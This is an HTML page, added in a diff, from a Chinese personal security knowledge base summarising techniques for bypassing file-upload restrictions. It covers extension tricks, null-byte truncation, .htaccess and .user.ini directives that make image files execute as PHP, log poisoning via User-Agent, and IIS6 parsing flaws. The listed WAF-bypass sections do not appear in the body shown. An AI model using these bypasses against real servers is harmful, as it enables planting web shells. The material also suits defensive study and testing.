@@ -1,0 +1,1627 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="F1rstb100d个人知识库，努力做一个全栈H4cker">
+      
+      
+        <meta name="author" content="F1rstb100d">
+      
+      
+        <link rel="canonical" href="https://f1rstb100d.github.io/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">
+      
+      <link rel="icon" href="../../../assets/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.5.10">
+    
+    
+      
+        <title>文件上传总结 - F1rstb100d知识库</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.472b142f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.08040f6c.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#4051b5">
+        
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="F1rstb100d知识库" class="md-header__button md-logo" aria-label="F1rstb100d知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            F1rstb100d知识库
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              文件上传总结
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/f1rstb100d/f1rstb100d.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    f1rstb100d.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../.." class="md-tabs__link">
+      知识库结构
+    </a>
+  </li>
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../SQL%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/" class="md-tabs__link md-tabs__link--active">
+        Web安全
+      </a>
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/" class="md-tabs__link">
+        二进制安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-tabs__link">
+        内网安全
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/" class="md-tabs__link">
+        环境配置
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="F1rstb100d知识库" class="md-nav__button md-logo" aria-label="F1rstb100d知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    F1rstb100d知识库
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/f1rstb100d/f1rstb100d.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    f1rstb100d.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        知识库结构
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Web安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Web安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          SQL注入
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SQL注入" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          SQL注入
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        sqlmap使用
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        SQL注入
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          XXE
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="XXE" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          XXE
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../XXE/XXE%E6%BC%8F%E6%B4%9E/" class="md-nav__link">
+        XXE漏洞
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3" type="checkbox" id="__nav_2_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3">
+          反序列化
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="反序列化" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          反序列化
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        Java反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        PHP反序列化
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        Python反序列化
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_4">
+          文件上传
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="文件上传" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          文件上传
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          文件上传总结
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        文件上传总结
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    代码层面
+  </a>
+  
+    <nav class="md-nav" aria-label="代码层面">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    前端校验文件后缀
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-type" class="md-nav__link">
+    Content-Type限制
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    文件后缀名检测
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    文件头检测
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    危险函数检测
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    二次渲染
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf" class="md-nav__link">
+    WAF层面
+  </a>
+  
+    <nav class="md-nav" aria-label="WAF层面">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    换行绕过
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    多个等号绕过
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    增大文件大小
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    去掉或替换引号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#filename" class="md-nav__link">
+    增加filename干扰
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf_1" class="md-nav__link">
+    混淆waf匹配字段
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    双文件绕过
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wafboundary" class="md-nav__link">
+    容器与WAF对Boundary要求规则不一致
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    条件竞争
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session" class="md-nav__link">
+    Session竞争
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          二进制安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="二进制安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          二进制安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        PWN入门
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          内网安全
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="内网安全" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          内网安全
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/" class="md-nav__link">
+        PTH传递攻击
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          环境配置
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="环境配置" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          环境配置
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        Git入门
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    代码层面
+  </a>
+  
+    <nav class="md-nav" aria-label="代码层面">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    前端校验文件后缀
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-type" class="md-nav__link">
+    Content-Type限制
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    文件后缀名检测
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    文件头检测
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    危险函数检测
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    二次渲染
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf" class="md-nav__link">
+    WAF层面
+  </a>
+  
+    <nav class="md-nav" aria-label="WAF层面">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    换行绕过
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    多个等号绕过
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    增大文件大小
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    去掉或替换引号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#filename" class="md-nav__link">
+    增加filename干扰
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf_1" class="md-nav__link">
+    混淆waf匹配字段
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    双文件绕过
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wafboundary" class="md-nav__link">
+    容器与WAF对Boundary要求规则不一致
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    条件竞争
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#session" class="md-nav__link">
+    Session竞争
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <a href="https://github.com/f1rstb100d/f1rstb100d.github.io/edit/master/docs/Web安全/文件上传/文件上传总结.md" title="编辑此页" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+  <h1>文件上传总结</h1>
+
+<h2 id="_1">代码层面<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="_2">前端校验文件后缀<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<ol>
+<li>禁用检测的js代码</li>
+<li>上传后抓包修改filename参数</li>
+</ol>
+<h3 id="content-type">Content-Type限制<a class="headerlink" href="#content-type" title="Permanent link">&para;</a></h3>
+<p>上传时抓包修改Content-type为<code>image/jpeg</code></p>
+<h3 id="_3">文件后缀名检测<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<ol>
+<li>大小写绕过</li>
+<li><code>.</code>、<code>_</code>和空格绕过：<strong>Windows系统下</strong>，文件名后缀最后一个<code>.</code>、<code>_</code>和空格会被自动去除；并且点+空格+点也可以尝试绕过，如<code>xxx.php. .</code></li>
+<li><code>::$DATA</code>绕过：<strong>Windows系统下</strong>，文件名+<code>::$DATA</code>会把DATA之后的数据当成文件流处理,不会检测后缀名，如<code>filename="test.php::$DATA"</code>（一个冒号仅创建一个空文件）</li>
+<li>双写绕过：有些函数会替换敏感文件名，但不递归删除的话就可以双写绕过，例如<code>filename=a.phphpp</code></li>
+<li>00截断绕过：上传时上传<code>a.php.jpg</code>，抓包在php后添加一个字符修改其HEX值为00，这样解析之后就是<code>a.php</code>了</li>
+</ol>
+<p>满足条件：php版本小于5.3.4；php.ini中magic_quotes_gpc = Off</p>
+<ol>
+<li>扩展名替换：</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="x">asp/aspx: asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</span>
+
+<span class="x">php : php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</span>
+
+<span class="x">jsp : jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</span>
+</code></pre></div>
+<ol>
+<li><code>.htaccess</code>和<code>.user.ini</code>绕过黑名单：</li>
+</ol>
+<p><code>.htaccess</code>只适用apache </p>
+<p>①、Allow Override All </p>
+<p>②、LoadModule rewrite_module modules/mod_rewrite.so #rewrite模块为开启状态</p>
+<p>上传<code>.htaccess</code>文件，写入：</p>
+<div class="highlight"><pre><span></span><code>方式一：AddType application/x-httpd-php .jpg
+将所有后缀为.jpg的文件作为php文件解析
+
+方式二：
+&lt;FilesMatch &quot;*.jpg&quot;&gt;
+SetHandler application/x-httpd-php   #在当前目录下，如果匹配到.jpg文件，则被解析成PHP代码执行
+AddHandler php5-script .jpg          #在当前目录下，如果匹配到.jpg文件，则被解析成PHP代码执行
+&lt;/FilesMatch&gt;
+</code></pre></div>
+<p><code>.user.ini</code>适用于服务器使用CGI／FastCGI模式且目录下要有可执行的php文件</p>
+<p>上传<code>.user.ini</code>文件，写入：</p>
+<div class="highlight"><pre><span></span><code><span class="na">auto_prepend_file</span><span class="o">=</span><span class="s">a.jpg</span><span class="w"></span>
+<span class="na">a.jpg中符合php语言的代码会被执行</span><span class="w"></span>
+<span class="na">auto_append_file</span><span class="o">=</span><span class="s">filename       //包含在文件尾</span><span class="w"></span>
+</code></pre></div>
+<p>在所有php执行前都会先include上<code>a.jpg</code></p>
+<p>补充：可以考虑包含日志文件，然后UA传一句话写入日志</p>
+<div class="highlight"><pre><span></span><code><span class="na">auto_prepend_file</span><span class="o">=</span><span class="s">/var/log/nginx/access.log</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>配合目录解析漏洞</li>
+</ol>
+<p>查看响应包Server中显示IIS6.0，修改上传文件名为<code>shell.php;jpg</code>或者<code>shell.php;.jpg</code>，然后访问这个文件即可（访问也要加上jpg）</p>
